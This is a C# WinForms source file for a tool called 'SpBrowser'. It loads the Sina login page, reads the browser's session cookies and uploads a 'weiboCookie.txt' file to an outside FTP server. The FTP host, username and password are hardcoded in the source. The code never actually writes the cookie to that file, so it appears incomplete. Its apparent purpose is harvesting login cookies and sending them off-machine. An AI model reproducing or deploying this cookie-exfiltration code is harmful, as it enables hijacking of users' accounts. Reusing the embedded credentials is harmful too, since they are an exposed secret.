using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SpBrowser
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            urlText.Text = "http://login.sina.com.cn/";
        }

        private void jump_Click(object sender, EventArgs e)
        {
            webBrowser.Navigate(urlText.Text);
            while (webBrowser.ReadyState != WebBrowserReadyState.Complete) Application.DoEvents();

        }

        private void cookieBtn_Click(object sender, EventArgs e)
        {
            CookieContainer myCookieContainer = new CookieContainer();
            string cookieStr = webBrowser.Document.Cookie;
            MessageBox.Show(cookieStr);
            FtpHelper ftp = new FtpHelper("qxw1151970042.my3w.com", "qxw1151970042", "2131402780");
            ftp.Upload("/d/weiboCookie.txt");
        }
    }
}
